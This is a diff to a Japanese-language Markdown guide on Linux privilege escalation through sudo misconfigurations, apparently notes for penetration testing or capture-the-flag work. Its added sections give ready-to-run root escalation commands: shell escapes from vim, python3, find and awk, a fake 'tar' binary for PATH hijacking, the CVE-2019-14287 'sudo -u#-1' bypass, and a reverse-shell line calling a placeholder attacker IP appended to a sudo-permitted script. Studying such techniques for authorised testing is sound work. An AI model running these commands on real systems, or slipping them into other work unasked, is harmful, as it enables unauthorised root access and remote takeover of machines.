@@ -16,6 +16,23 @@ sudo -l
 
 ---
 
+## 観点・着眼点（パターン全体）
+
+**`sudo -l` の出力で何に気付くか：**
+
+| `sudo -l` に見える要素 | 示唆 | 次のアクション |
+|--------------------|-----|------------|
+| `NOPASSWD:` | パスワード不要で sudo 実行可能 | 該当コマンドを GTFOBins で検索 |
+| `(ALL : ALL)` / `(ALL)` | 任意ユーザーとして実行可 | そのまま `sudo -u root [CMD]` |
+| `(root)` が明示 | root 権限で実行できる | 昇格経路として最優先 |
+| コマンドの末尾が `*`（ワイルドカード） | 引数を自由に指定可能 | サブコマンドや `--config` などから escape を狙う |
+| スクリプトパスが `/opt/` / `/home/` 配下 | 自作スクリプトの可能性 | 書き込み権限があれば内容を書き換えて悪用 |
+| `env_keep+=LD_PRELOAD` | 環境変数を引き継ぐ | 共有ライブラリ注入（LD_PRELOAD 攻撃） |
+| `sudo` のバージョンが 1.8.28 未満 | CVE-2019-14287（`!root` バイパス）候補 | `sudo -u#-1 [CMD]` を試す |
+| `docker` / `docker exec` への許可 | コンテナブレイクアウト候補 | パターン4へ |
+
+---
+
 ## 典型的な出力パターンと対応
 
 ### パターン1: 特定コマンドに NOPASSWD
@@ -28,6 +45,27 @@ sudo -l
 
 → GTFOBins で対象コマンドの「Sudo」セクションを確認
 
+**悪用手順：**
+```bash
+# vim / nano / less
+sudo vim -c ':!/bin/bash'
+
+# python / python3
+sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# find
+sudo find . -exec /bin/bash \; -quit
+
+# awk
+sudo awk 'BEGIN {system("/bin/bash")}'
+```
+
+**注意点・落とし穴：**
+- 絶対パスが指定されている（`/usr/bin/vim`）場合、シンボリックリンクや PATH 経由での呼び出しは通らない。そのパスで呼ぶ
+- バイナリが別の場所にも存在し、片方だけ許可されている場合がある。`which vim` で確認
+- GTFOBins にない独自コマンドでも、内部で外部コマンドを呼んでいれば PATH ハイジャックで悪用できることがある
+- エディタ系（`vim`, `nano`, `less`, `more`, `man`）は「編集機能から外部コマンド実行」が共通パターン
+
 ### パターン2: ALL コマンドを許可
 
 ```
@@ -36,17 +74,40 @@ sudo -l
 
 → `sudo /bin/bash` で即座に root
 
+**注意点・落とし穴：**
+- これが見えた時点で即 root。他の探索に時間を使わない
+- ただし `sudo -l` 実行自体にパスワードが必要なケースがある（`Defaults rootpw` 設定等）。現ユーザーのパスワードを取得してから再実行
+
 ### パターン3: 特定スクリプトの実行を許可
 
 ```
 (ALL) NOPASSWD: /opt/scripts/backup.sh
 ```
 
-→ スクリプト自体が書き込み可能であれば改ざんして権限昇格
+**悪用手順：**
+```bash
+# スクリプトが書き込み可能な場合 → 直接書き換え
+echo 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1' >> /opt/scripts/backup.sh
+sudo /opt/scripts/backup.sh
+
+# スクリプトが書き込み不可 → スクリプト内から呼ばれる外部コマンドの PATH ハイジャック
+# 1. スクリプトを cat で読む
+cat /opt/scripts/backup.sh
+# 2. フルパスなしで呼ばれているコマンド（例: tar, cp）を確認
+# 3. /tmp/tar に偽バイナリを置いて PATH を先頭に注入
+echo -e '#!/bin/bash\n/bin/bash' > /tmp/tar && chmod +x /tmp/tar
+PATH=/tmp:$PATH sudo /opt/scripts/backup.sh
+```
+
+**注意点・落とし穴：**
+- スクリプトが書き込み可能か確認: `ls -la /opt/scripts/backup.sh`
+- 書き込み不可でも「親ディレクトリが書き込み可能」なら元ファイルを消して同名で作り直せる
+- スクリプト内のフルパスなしコマンド（`tar`, `cp`, `date` 等）は PATH ハイジャック対象
+- `sudo` は既定で `secure_path` を強制するため単純な PATH 汚染は効かないことが多い。`sudoers` に `env_reset` が無い / `secure_path` が定義されていない時のみ有効
 
 ---
 
-## 悪用手順
+## 悪用手順（共通テクニック）
 
 ### vim / nano / less
 
@@ -86,13 +147,13 @@ sudo /opt/scripts/backup.sh
 
 ---
 
-## 注意点・落とし穴
+## 全パターン共通の注意点・落とし穴
 
 - `sudo -l` でパスワードを求められる場合でも、現在のユーザーのパスワードが判明していれば入力できる
 - `env_keep` の設定次第では環境変数（`LD_PRELOAD` 等）を引き継いで悪用できる
-- sudoers の `!root` 指定（特定ユーザー以外として実行）は古い sudo でバイパスできる場合がある（CVE-2019-14287）
-
----
+- sudoers の `!root` 指定（特定ユーザー以外として実行）は古い sudo でバイパスできる場合がある（CVE-2019-14287 → `sudo -u#-1 [CMD]`）
+- `sudo -l` は「現在のセッション・ユーザー」に対してしか表示されない。su / ssh で別ユーザーになったら再実行する
+- `tty_tickets` が有効だと tty ごとにパスワードキャッシュが分かれる。別シェルで通っても別 tty では通らない
 
 ---
 
